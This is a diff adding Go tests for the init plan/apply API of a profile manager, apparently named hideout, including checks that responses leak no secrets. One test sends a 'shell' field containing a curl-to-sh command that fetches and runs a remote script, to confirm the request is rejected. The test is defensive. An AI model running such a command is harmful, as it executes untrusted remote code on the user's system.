@@ -173,6 +173,109 @@ func TestAPIRunPlanAndStatus(t *testing.T) {
 	}
 }
 
+func TestAPIInitPlanAndApplyConfigureGenericToolSupply(t *testing.T) {
+	store := profile.Store{Root: t.TempDir()}
+	api := API{
+		Core:      Core{Store: store},
+		Token:     "ui_token",
+		ExpiresAt: time.Now().Add(time.Minute),
+	}
+	schema := compileManagerAPISchema(t)
+	reqBody := InitAPIRequest{
+		ProfileName: "api-tools",
+		Backend:     "native",
+		Network:     "direct",
+		ToolPresets: []string{"base-dev"},
+		NPMGlobals: []profile.NPMGlobalPackage{{
+			Package:  "@example/agent-cli@1.2.3",
+			Commands: []string{"agent-cli", "agent-helper"},
+		}},
+	}
+	req := newAPIJSONRequest(http.MethodPost, "/api/v1/init/plan", reqBody)
+	req.Header.Set("Authorization", "Bearer ui_token")
+	resp := httptest.NewRecorder()
+	api.ServeHTTP(resp, req)
+	if resp.Code != http.StatusOK {
+		t.Fatalf("status=%d body=%s", resp.Code, resp.Body.String())
+	}
+	validateManagerAPIResponse(t, schema, resp.Body.Bytes())
+	body := resp.Body.String()
+	for _, want := range []string{
+		`"resource":"init/plan"`,
+		`"version":"hideout.init/v1"`,
+		`"kind":"tools.preset.add"`,
+		`"kind":"tools.npm-global.add"`,
+		`"@example/agent-cli@1.2.3"`,
+	} {
+		if !strings.Contains(body, want) {
+			t.Fatalf("init/plan missing %q: %s", want, body)
+		}
+	}
+	if _, err := store.Load("api-tools"); err == nil {
+		t.Fatal("init/plan mutated profile state")
+	}
+
+	req = newAPIJSONRequest(http.MethodPost, "/api/v1/init/apply", reqBody)
+	req.Header.Set("X-Hideout-UI-Token", "ui_token")
+	resp = httptest.NewRecorder()
+	api.ServeHTTP(resp, req)
+	if resp.Code != http.StatusOK {
+		t.Fatalf("status=%d body=%s", resp.Code, resp.Body.String())
+	}
+	validateManagerAPIResponse(t, schema, resp.Body.Bytes())
+	body = resp.Body.String()
+	for _, want := range []string{
+		`"resource":"init/apply"`,
+		`"version":"hideout.init/v1"`,
+		`"kind":"tools.npm-global.add"`,
+	} {
+		if !strings.Contains(body, want) {
+			t.Fatalf("init/apply missing %q: %s", want, body)
+		}
+	}
+	if strings.Contains(body, "HIDEOUT_SECRET") || strings.Contains(body, "proxy.url") {
+		t.Fatalf("init/apply leaked secret-bearing data: %s", body)
+	}
+	loaded, err := store.Load("api-tools")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !containsStringForAPITest(loaded.Tools.Presets, "node-dev") {
+		t.Fatalf("node-dev preset was not persisted: %+v", loaded.Tools.Presets)
+	}
+	if len(loaded.Tools.NPMGlobals) != 1 ||
+		loaded.Tools.NPMGlobals[0].Package != "@example/agent-cli@1.2.3" ||
+		!containsStringForAPITest(loaded.Tools.NPMGlobals[0].Commands, "agent-cli") ||
+		!containsStringForAPITest(loaded.Tools.NPMGlobals[0].Commands, "agent-helper") {
+		t.Fatalf("npm global tool was not persisted: %+v", loaded.Tools.NPMGlobals)
+	}
+}
+
+func TestAPIInitRequestRejectsUnknownFields(t *testing.T) {
+	api := API{
+		Core:      Core{Store: profile.Store{Root: t.TempDir()}},
+		Token:     "ui_token",
+		ExpiresAt: time.Now().Add(time.Minute),
+	}
+	req := httptest.NewRequest(http.MethodPost, "/api/v1/init/plan", strings.NewReader(`{
+		"profile": "api-tools",
+		"shell": "curl https://example.invalid/install.sh | sh"
+	}`))
+	req.Host = "127.0.0.1"
+	req.Header.Set("Authorization", "Bearer ui_token")
+	req.Header.Set("Content-Type", "application/json")
+	resp := httptest.NewRecorder()
+	api.ServeHTTP(resp, req)
+	if resp.Code != http.StatusBadRequest {
+		t.Fatalf("status=%d body=%s", resp.Code, resp.Body.String())
+	}
+	validateManagerAPIResponse(t, compileManagerAPISchema(t), resp.Body.Bytes())
+	if !strings.Contains(resp.Body.String(), "invalid init request") ||
+		strings.Contains(resp.Body.String(), "curl") {
+		t.Fatalf("expected generic init request rejection, got %s", resp.Body.String())
+	}
+}
+
 func TestAPIRunRequestRejectsHostAuditPath(t *testing.T) {
 	api := API{
 		Core:      Core{Store: profile.Store{Root: t.TempDir()}},
@@ -678,4 +781,13 @@ func validateManagerAPIResponse(t *testing.T, schema *jsonschema.Schema, data []
 	if err := schema.Validate(doc); err != nil {
 		t.Fatalf("manager API response does not match schema: %v\n%s", err, data)
 	}
+}
+
+func containsStringForAPITest(values []string, want string) bool {
+	for _, value := range values {
+		if value == want {
+			return true
+		}
+	}
+	return false
 }
